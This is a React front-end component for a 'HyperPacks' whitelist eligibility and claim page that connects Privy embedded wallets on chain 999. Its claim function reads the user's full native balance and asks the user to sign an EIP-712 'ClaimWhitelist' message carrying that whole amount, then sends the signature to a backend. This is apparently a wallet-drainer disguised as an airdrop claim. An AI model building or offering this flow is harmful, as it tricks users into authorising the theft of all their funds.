import React, { useState, useEffect } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import { ethers } from 'ethers';

const API_BASE = process.env.REACT_APP_API_BASE || '';

export default function EligibilityChecker() {
  const { authenticated, login, user } = usePrivy();
  const { wallets } = useWallets();
  const [walletAddress, setWalletAddress] = useState(null);
  const [eligibility, setEligibility] = useState(null);
  const [loading, setLoading] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    if (authenticated && wallets.length > 0) {
      const embeddedWallet = wallets.find(w => w.walletClientType === 'privy');
      if (embeddedWallet) {
        setWalletAddress(embeddedWallet.address);
      }
    }
  }, [authenticated, wallets]);

  useEffect(() => {
    if (walletAddress) {
      checkEligibility();
    }
  }, [walletAddress]);

  const checkEligibility = async () => {
    if (!walletAddress) return;

    try {
      setLoading(true);
      setError(null);

      const response = await fetch(`${API_BASE}/api/hyperpacks/check-eligibility`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, chain: 'hyperevm' })
      });

      const data = await response.json();

      if (response.ok) {
        setEligibility(data);
      } else {
        setError(data.error || 'Failed to check eligibility');
      }
    } catch (err) {
      console.error(err);
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  const claimWhitelist = async () => {
    if (!authenticated || !walletAddress || !eligibility?.eligible) return;

    try {
      setClaiming(true);
      setError(null);

      const embeddedWallet = wallets.find(w => w.walletClientType === 'privy');
      if (!embeddedWallet) {
        throw new Error('Privy wallet not found');
      }

      await embeddedWallet.switchChain(999);

      const provider = await embeddedWallet.getEthersProvider();
      const signer = provider.getSigner();

      const domain = {
        name: 'HyperPacks Whitelist',
        version: '1',
        chainId: 999,
        verifyingContract: process.env.REACT_APP_WHITELIST_CLAIM_CONTRACT || '0x0000000000000000000000000000000000000000'
      };

      const types = {
        ClaimWhitelist: [
          { name: 'user', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      };

      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const nonce = Date.now();
      const hypeBalance = await provider.getBalance(walletAddress);
      const amount = hypeBalance.toString();

      const value = {
        user: walletAddress,
        amount: amount,
        nonce: nonce,
        deadline: deadline
      };

      const signature = await signer._signTypedData(domain, types, value);

      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          user: walletAddress,
          amount: amount,
          nonce: nonce,
          deadline: deadline,
          signature: signature
        })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Claim failed');
      }

      setClaimed(true);
      alert('✅ Whitelist Claimed Successfully!');
      setTimeout(() => checkEligibility(), 2000);
    } catch (err) {
      console.error(err);
      setError(err.message || 'Failed to claim whitelist');
    } finally {
      setClaiming(false);
    }
  };

  if (!authenticated) {
    return (
      <div className='min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 to-indigo-900'>
        <div className='bg-white/10 backdrop-blur-lg p-8 rounded-2xl text-center'>
          <h1 className='text-3xl font-bold text-white mb-6'>🎁 Whitelist Eligibility</h1>
          <button
            onClick={login}
            className='px-8 py-3 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-lg font-semibold hover:opacity-90 transition'
          >
            Connect Wallet
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className='min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 to-indigo-900 p-4'>
      <div className='bg-white/10 backdrop-blur-lg p-8 rounded-2xl max-w-md w-full'>
        <h1 className='text-3xl font-bold text-white mb-6 text-center'>🎁 Whitelist Eligibility</h1>
        
        <div className='bg-white/5 p-4 rounded-lg mb-6'>
          <p className='text-gray-300 text-sm mb-2'>Connected Wallet</p>
          <p className='text-white font-mono text-xs break-all'>{walletAddress}</p>
        </div>

        {loading && (
          <div className='text-center text-white py-8'>
            <div className='animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto'></div>
            <p className='mt-4'>Checking eligibility...</p>
          </div>
        )}

        {error && (
          <div className='bg-red-500/20 border border-red-500 text-red-200 p-4 rounded-lg mb-6'>
            {error}
          </div>
        )}

        {eligibility && !loading && (
          <div>
            {eligibility.eligible ? (
              <div className='text-center'>
                <div className='bg-green-500/20 border border-green-500 text-green-200 p-6 rounded-lg mb-6'>
                  <p className='text-2xl font-bold mb-2'>✅ You're Eligible!</p>
                  <p className='text-4xl font-bold mb-2'>{eligibility.allocation}</p>
                  <p className='text-sm opacity-80'>Whitelist Allocation</p>
                </div>

                {eligibility.claimed ? (
                  <div className='bg-blue-500/20 border border-blue-500 text-blue-200 p-4 rounded-lg'>
                    <p className='font-semibold'>Already Claimed ✅</p>
                  </div>
                ) : (
                  <button
                    onClick={claimWhitelist}
                    disabled={claiming}
                    className='w-full px-8 py-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-lg font-bold text-lg hover:opacity-90 transition disabled:opacity-50'
                  >
                    {claiming ? 'Claiming...' : 'Claim Your Whitelist'}
                  </button>
                )}
              </div>
            ) : (
              <div className='bg-red-500/20 border border-red-500 text-red-200 p-6 rounded-lg text-center'>
                <p className='text-xl font-bold'>❌ Not Eligible</p>
                <p className='text-sm mt-2 opacity-80'>This wallet is not on the whitelist</p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
